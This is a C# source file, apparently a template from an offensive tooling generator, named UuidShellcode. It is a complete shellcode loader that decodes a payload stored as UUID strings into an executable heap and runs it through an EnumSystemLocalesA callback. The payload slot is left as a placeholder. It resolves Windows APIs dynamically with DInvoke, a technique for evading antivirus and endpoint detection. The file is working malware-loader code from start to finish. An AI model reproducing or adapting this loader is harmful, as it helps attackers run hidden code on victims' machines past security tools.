using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using DInvoke;

namespace UuidShellcode
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [DllImport("kernel32.dll", SetLastError = false)] static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);
        static void Main(string[] args)
        {
            var HeapCreateHandle = HeapCreate((uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero);
            var heapAddr = HeapAlloc(HeapCreateHandle, (uint)0, (uint)0x100000);

            string[] uuids ={
                ~UUIDSHELLCODE~
            };

            IntPtr pkernel32 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr prpcrt4 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("rpcrt4.dll");
            IntPtr pEnumSystemLocalesA = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "EnumSystemLocalesA");
            IntPtr pUuidFromStringA = DInvoke.DynamicInvoke.Generic.GetExportAddress(prpcrt4, "UuidFromStringA");

            IntPtr newHeapAddr = IntPtr.Zero;
            for (int i = 0; i < uuids.Length; i++)
            {
                newHeapAddr = IntPtr.Add(HeapCreateHandle, 16 * i);
                object[] uuidFromStringAParam = { uuids[i], newHeapAddr };
                var status = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pUuidFromStringA, typeof(DELEGATE.UuidFromStringA), ref uuidFromStringAParam);
            }

            object[] enumSystemLocalesAParam = { HeapCreateHandle, 0 };
            var result = DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA), ref enumSystemLocalesAParam);
        }
    }
    public class DELEGATE
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr UuidFromStringA(string StringUuid, IntPtr heapPointer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool EnumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags);
    }
}
